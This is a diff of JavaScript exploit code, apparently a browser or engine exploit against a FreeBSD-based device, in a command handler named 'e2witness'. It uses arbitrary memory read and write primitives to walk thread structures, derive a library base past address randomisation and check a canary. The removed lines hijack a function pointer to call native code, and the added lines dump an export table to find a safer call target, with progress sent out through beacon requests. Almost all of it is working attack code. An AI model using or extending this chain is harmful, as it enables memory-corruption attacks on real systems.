@@ -5434,27 +5434,46 @@ function _startWsShell(){
       }
 
       case 'e2witness':{
-        /* v13 - THE ONE-COMMAND E2 WITNESS (the council-delivered chain,
-         * session-49-proven end to end): registry entry (boot-stable) ->
-         * thread record -> struct pthread -> the _thread_list backlink at
-         * +0x40 (residue 0x218) -> lk_base -> canary gate -> THE IDENTIFIED
-         * CALL: gettimeofday at lk+0xB50 (14.10-named-import-proven), RDI =
-         * the pre-zeroed fake scope. FreeBSD copies tv BEFORE tz: the wall
-         * clock lands in our buffer regardless of the tz arg's fate. The
-         * kernel copyout is userland-validated - NO PANIC PATH. Every step
-         * rides a BLOCKING sync beacon - a death at the call moment still
-         * banks the derivation and the scope bytes. */
+        /* v14 - THE ROBUST CHAIN + THE NID HARVEST. Sessions 50-51 taught:
+         * (1) the entry/thread-record/pthread slot layouts VARY per session
+         * (zero slots, non-first nodes) - every step now SCANS its region
+         * for the first plausible value instead of fixed indices, with the
+         * backlink walk (up to 4 hops) until residue 0x218; (2) the
+         * gettimeofday call is RETIRED as the witness (2/2 deterministic
+         * deaths at the call moment: RSI - the uncontrolled tz pointer -
+         * points into the live frame machinery; the tz copyout corrupts it;
+         * the engine dies at the return path BEFORE the scope read runs).
+         * THE NEW TARGET: thr_self (syscall 432, ONE pointer argument = the
+         * TID output = RDI = the fake scope; NO second argument exists; the
+         * reply posts cleanly). Its RVA resolves via the export table:
+         * entries {hi: text_rva - 0x48000, lo: NID}; the entry at text 0xB50
+         * (gettimeofday, named-import-proven) yields NID(gettimeofday) ->
+         * the hash encoding cracks offline -> NID(thr_self) -> its entry ->
+         * its text RVA -> the single-argument call. This command derives
+         * the base, verifies the canary, and dumps the entries [512..0x82C)
+         * for the NID hunt. */
         if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
         function EW(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('E2W-'+s),false);x.send();}catch(e){}}
         try{
-          var ent=S.absRead(0x10001c8000n,0x20);
-          EW('1 entry, tr=0x'+ent[2].toString(16));
-          var tr=S.absRead(ent[2],0x20);
-          EW('2 tr, pt=0x'+tr[5].toString(16));
-          var pt=S.absRead(tr[5],0x60);
-          var Q=pt[8];
-          EW('3 Q=0x'+Q.toString(16));
-          if((Q&0x3fffn)!==0x218n){reply.err='backlink residue mismatch: 0x'+Q.toString(16);break;}
+          var ent=S.absRead(0x10001c8000n,0x100);
+          var trPtr=0n;
+          for(var ei=0;ei<ent.length;ei++){if(ent[ei]>=0x10001f0000n&&ent[ei]<0x1000200000n){trPtr=ent[ei];break;}}
+          EW('1 tr=0x'+trPtr.toString(16));
+          if(trPtr===0n){reply.err='no thread-record ptr in entry';break;}
+          var tr=S.absRead(trPtr,0x60);
+          var ptp=0n;
+          for(var ti2=0;ti2<tr.length;ti2++){if(tr[ti2]>=0x880000000n&&tr[ti2]<0x900000000n){ptp=tr[ti2];break;}}
+          EW('2 pt=0x'+ptp.toString(16));
+          if(ptp===0n){reply.err='no pthread ptr in record';break;}
+          var node=ptp,Q=0n;
+          for(var hop=0;hop<5;hop++){
+            var p=S.absRead(node,0x60);
+            Q=p[8];
+            EW('3 hop'+hop+' node=0x'+node.toString(16)+' Q=0x'+Q.toString(16));
+            if((Q&0x3fffn)===0x218n&&Q>0x800000000n)break;
+            node=Q-0x38n;
+          }
+          if((Q&0x3fffn)!==0x218n){reply.err='backlink walk failed: 0x'+Q.toString(16);break;}
           var B=Q-0x6C218n;
           if(B%0x4000n!==0n){reply.err='base unaligned: 0x'+B.toString(16);break;}
           EW('4 B=0x'+B.toString(16));
@@ -5463,21 +5482,19 @@ function _startWsShell(){
           if(!(can>0x1000000n)){reply.err='canary fail: 0x'+can.toString(16);break;}
           reply.base='0x'+B.toString(16);
           reply.canary='0x'+can.toString(16);
-          var tgt=B+0xB50n;
-          EW('6 CALL 0x'+tgt.toString(16));
-          for(var zw=0;zw<4;zw++)S.absWrite(S.fakeScope+BigInt(zw*8),0n);
-          if(S.scopeSlot&&S.fakeScope&&S.scopeOrig)S.absWrite(S.scopeSlot,S.fakeScope);
-          var oFnW=S.absRead(S.neEntry.addr+0x28n,8)[0];
-          S.absWrite(S.neEntry.addr+0x28n,tgt);
-          try{Math.round(-5.7);}catch(e){}
-          S.absWrite(S.neEntry.addr+0x28n,oFnW);
-          if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
-          var w0=S.absRead(S.fakeScope,8)[0],w1=S.absRead(S.fakeScope+8n,8)[0],w2=S.absRead(S.fakeScope+16n,8)[0],w3=S.absRead(S.fakeScope+24n,8)[0];
-          EW('7 SCOPE 0x'+w0.toString(16)+' 0x'+w1.toString(16)+' 0x'+w2.toString(16)+' 0x'+w3.toString(16));
-          reply.scope=['0x'+w0.toString(16),'0x'+w1.toString(16),'0x'+w2.toString(16),'0x'+w3.toString(16)];
-          reply.witness=(w0>0x40000000n&&w0<0x80000000n&&w1<0xF4240n);
-          if(reply.witness)EW('E2 WITNESS LANDED: sec=0x'+w0.toString(16)+' usec=0x'+w1.toString(16));
-          else EW('no witness write');
+          /* THE NID HARVEST: the export table at B+0x48000; dump the
+           * entries [512, 0x82C) (the first 512 banked in session 49 -
+           * entry #8 = the verified stub 0x410, lo=0xf49c) - the reply
+           * carries the raw entries for the offline NID hunt. */
+          var tbl=B+0x48000n;
+          var eAry=[];
+          for(var offE=0x1008;offE<0x4160;offE+=0x400){
+            var ew=S.absRead(tbl+BigInt(offE),0x400);
+            for(var wi3=0;wi3<ew.length;wi3++)eAry.push('0x'+ew[wi3].toString(16));
+            EW('6 entries +0x'+offE.toString(16)+' n='+eAry.length);
+          }
+          reply.entries=eAry;
+          EW('7 NID HARVEST DONE n='+eAry.length);
         }catch(e2){reply.err='chain fault: '+String(e2&&e2.message?e2.message:'?');}
         break;
       }
